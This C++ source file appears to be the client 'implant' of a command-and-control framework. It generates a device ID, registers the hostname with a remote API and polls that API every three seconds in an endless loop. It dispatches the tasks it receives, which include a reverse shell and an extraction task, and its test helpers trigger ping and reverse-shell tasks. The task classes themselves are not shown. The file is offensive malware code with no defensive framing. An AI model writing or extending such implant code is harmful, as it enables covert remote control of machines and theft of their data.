#include "implant.hpp"


#include <string>
#include <string_view>
#include <iostream>
#include <chrono>
#include <vector>
#include <algorithm>

#include <boost/uuid/uuid_generators.hpp>
#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <boost/property_tree/ptree.hpp>
#include <boost/asio/ip/host_name.hpp>

#include "../includes/single_include/nlohmann/json.hpp"

#include <cpr/cpr.h>

using json = nlohmann::json;

Implant::Implant()
{   
    /* Generate unique id */
    boost::uuids::random_generator gen;
    boost::uuids::uuid ids = gen();
    std::cout << ids << '\n';
    id = boost::uuids::to_string(ids);
}

void Implant::beacon() {
    Api api = Api::get_instance();

    /* Register device */
    auto host = boost::asio::ip::host_name(); 
    api.register_device(id, host);

    /* Loop */
    while (true)
    {
        /* Assert that we can communicate with the API */
        if (!api.assert_ping_pong()) {
            sleep(3);
            continue;
        }
        
        /* Get all the tasks for this device */
        std::string response_task_to_do = api.get_tasks(id);
        parse_tasks_response(response_task_to_do);
        run_all();

        sleep(3);
    }
}

void Implant::parse_tasks_response(const std::string &response)
{
    if(response.empty()) return;
    // Local response variable
    std::stringstream ss{ response };

    // Read response from listening post as JSON
    boost::property_tree::ptree root;
    boost::property_tree::read_json(ss, root);

    for (auto &task : root)
        tasks.push_back(parse_task_from_string(task.second.get<std::string>("name")));
}

void Implant::run_all() {
    while (!tasks.empty())
    {
        std::unique_ptr<Task> task = std::move(tasks.back()); 
        tasks.pop_back();

        if (!task.get()) continue;
        if (PingTask* ping_task = dynamic_cast<PingTask*>(task.get()))
            ping_task->run();
        if (ReverseShellTask* rs_task = dynamic_cast<ReverseShellTask*>(task.get()))
            rs_task->run();
        if (ExtractTask* extract_task = dynamic_cast<ExtractTask*>(task.get()))
            extract_task->run();
    }
}


void Implant::test_get_tasks() {
    parse_tasks_response("[{\"uid\":\"8db4dd5c-61ec-41e1-a5fc-9e78c8a1a90c\",\"name\":\"ping\"},{\"uid\":\"8db4dd5c-61ec-41e1-a5fc-9e78c8a1a90c\",\"name\":\"ping\"}]");
    
    run_all();
}

void Implant::test_reverse_shell() {
    parse_tasks_response("[{\"uid\":\"8db4dd5c-61ec-41e1-a5fc-9e78c8a1a90c\",\"name\":\"reverse_shell\"}]");
    
    run_all();
}